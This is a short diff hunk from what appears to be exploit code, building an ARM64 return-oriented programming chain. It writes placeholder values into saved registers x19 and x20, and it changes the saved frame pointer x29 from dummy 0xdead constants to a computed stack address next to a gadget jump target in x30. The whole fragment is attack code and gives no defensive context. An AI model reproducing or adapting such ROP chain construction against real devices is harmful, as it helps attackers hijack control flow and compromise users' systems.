@@ -604,8 +604,9 @@
             arr[pos++] = 0xdead0029;                // x20 (unused)
             arr[pos++] = 0xdead002a;                // x19 (unused)
             arr[pos++] = 0xdead002b;                // x19 (unused)
-            arr[pos++] = 0xdead002c;                // x29 (unused)
-            arr[pos++] = 0xdead002d;                // x29 (unused)
+            tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4 + 0x60).lo(); // x29 (unused)
+            arr[pos++] = Add(stack, tmppos*4 + 0x60).hi(); // x29 (unused)
             arr[pos++] = jump_to.lo();              // x30 (gadget)
             arr[pos++] = jump_to.hi();              // x30 (gadget)
         }
